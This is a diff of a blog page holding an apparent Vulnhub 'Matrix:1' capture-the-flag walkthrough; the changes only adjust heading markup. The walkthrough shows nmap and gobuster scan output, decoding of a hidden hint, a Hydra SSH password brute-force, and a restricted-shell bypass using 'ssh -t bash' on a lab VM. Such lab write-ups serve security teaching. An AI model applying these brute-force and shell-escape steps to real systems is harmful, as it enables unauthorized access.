@@ -54,11 +54,11 @@ Contact Me
 <div class="row justify-content-center">
 <div class=col-lg-8>
 <article class=site-blog-details>
-<h2 class=blog-title>Matrix:1 Vulnhub Walkthrough</h2>
 <p><span>September 25, 2020</span> by <span>Nasef</span></p>
+<h2 class=blog-title>Matrix:1 Vulnhub Walkthrough</h2>
 <img class=feature-image src=https://iamnasef.com/images/blog/featured-image-vulnhub.png alt=blog-feature-image>
 <p>Matrix:1 is a machine in which I used Enumeration to obtain shell access and then exploited the misconfigured sudo permissions to get root Access.</p>
-<h3 id=scanning>Scanning</h3>
+<h2 id=scanning>Scanning</h2>
 <p>As always, I started scanning with Nmap</p>
 <pre><code>root@kali:/home/kali# nmap -sC -sV 192.168.198.139
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-25 00:30 EDT
@@ -81,7 +81,7 @@ MAC Address: 00:0C:29:43:C6:92 (VMware)
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 9.96 seconds
 </code></pre><p>Interesting two http services!</p>
-<h3 id=web-enumeration>Web Enumeration</h3>
+<h2 id=web-enumeration>Web Enumeration</h2>
 <p>Then I enumerated directories and files using gobuster on both services but there is no useful information</p>
 <pre><code>root@kali:/home/kali# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 192.168.198.139 -x php,html,json,py,matrix
 ===============================================================
@@ -114,10 +114,10 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 ===============================================================
 
 </code></pre><p>Nothing really important here.</p>
-<h3 id=inspecting-element>Inspecting Element</h3>
+<h2 id=inspecting-element>Inspecting Element</h2>
 <p>So, I started digging in the http services in port 80 and 3117. I found a base64 encoded text while inspecting element on port 31337.</p>
 <p><img src=/images/blog/002/1.png alt=Username></p>
-<h3 id=cracking>Cracking</h3>
+<h2 id=cracking>Cracking</h2>
 <p>After decoding</p>
 <p><img src=/images/blog/002/2.png alt=Username></p>
 <p>so I visted http://192.168.198.139:1337/Cypher.matrix , a filed was downloaded which contained this strange ciphertext</p>
@@ -145,7 +145,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-25 01:13:
 [STATUS] attack finished for 192.168.198.139 (valid pair found)
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-25 01:21:21
-</code></pre><h3 id=privilege-escalation>Privilege Escalation</h3>
+</code></pre><h2 id=privilege-escalation>Privilege Escalation</h2>
 <p>When I sshed to the user guest, it gave me a restricted shell so I bypassed the restriction by using this command</p>
 <pre><code>root@kali:/home/kali# ssh guest@192.168.198.139 -t bash
 
